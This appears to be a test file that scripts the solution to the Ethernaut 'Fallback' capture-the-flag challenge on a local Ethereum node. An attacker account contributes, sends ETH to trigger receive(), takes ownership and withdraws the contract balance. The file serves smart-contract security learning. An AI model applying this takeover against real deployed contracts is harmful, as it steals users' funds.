
import { beforeEach, describe, it } from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { ethers } from "ethers";

const providerUrl = "http://127.0.0.1:8545";

const artifact = JSON.parse(
  await readFile(
    new URL("../artifacts/contracts/Fallback.sol/Fallback.json", import.meta.url),
    "utf8"
  )
);

describe("Ethernaut Challenge 01: Fallback", () => {
  let provider;
  let deployer;
  let attacker;
  let fallback;

  beforeEach(async () => {
    provider = new ethers.JsonRpcProvider(providerUrl);

    // Account 0 deploys the challenge.
    deployer = await provider.getSigner(0);

    // Account 1 is the attacker.
    attacker = await provider.getSigner(1);

    // Deploy a fresh Fallback contract for every test.
    const factory = new ethers.ContractFactory(
      artifact.abi,
      artifact.bytecode,
      deployer
    );

    fallback = await factory.deploy();
    await fallback.waitForDeployment();
  });

  it("assigns ownership to the deployer initially", async () => {
    assert.equal(
      (await fallback.owner()).toLowerCase(),
      (await deployer.getAddress()).toLowerCase()
    );
  });

  it("allows the attacker to contribute", async () => {
    const attackerContract = fallback.connect(attacker);

    const tx = await attackerContract.contribute({
      value: ethers.parseEther("0.0001"),
    });

    await tx.wait();

    assert.equal(
      await fallback.contributions(await attacker.getAddress()),
      ethers.parseEther("0.0001")
    );
  });

  it("transfers ownership through the receive function", async () => {
    const attackerAddress = await attacker.getAddress();
    const attackerContract = fallback.connect(attacker);

    // The attacker must first have a positive contribution.
    await (
      await attackerContract.contribute({
        value: ethers.parseEther("0.0001"),
      })
    ).wait();

    // Sending ETH directly invokes receive().
    await (
      await attacker.sendTransaction({
        to: await fallback.getAddress(),
        value: ethers.parseEther("0.0001"),
      })
    ).wait();

    assert.equal(
      (await fallback.owner()).toLowerCase(),
      attackerAddress.toLowerCase()
    );
  });

  it("allows the new owner to withdraw the contract balance", async () => {
    const attackerAddress = await attacker.getAddress();
    const attackerContract = fallback.connect(attacker);
    const contractAddress = await fallback.getAddress();

    await (
      await attackerContract.contribute({
        value: ethers.parseEther("0.0001"),
      })
    ).wait();

    await (
      await attacker.sendTransaction({
        to: contractAddress,
        value: ethers.parseEther("0.0001"),
      })
    ).wait();

    assert.equal(
      (await fallback.owner()).toLowerCase(),
      attackerAddress.toLowerCase()
    );

    const balanceBefore = await provider.getBalance(contractAddress);
    assert.equal(balanceBefore, ethers.parseEther("0.0002"));

    console.log("Contract:", contractAddress);
    console.log("Owner:", await fallback.owner());
    console.log("Withdraw function:", fallback.interface.getFunction("withdraw").format());
    console.log("Code size:", (await provider.getCode(contractAddress)).length);
    console.log("Balance before:", await provider.getBalance(contractAddress));
 
    const tx = await attackerContract.withdraw();
    const receipt = await tx.wait();

    assert.equal(receipt.status, 1);

    // Query state at the block that included the withdrawal.
    const balanceAfter = await provider.getBalance(
      contractAddress,
      receipt.blockNumber
    );

    assert.equal(balanceAfter, 0n);

  });

});
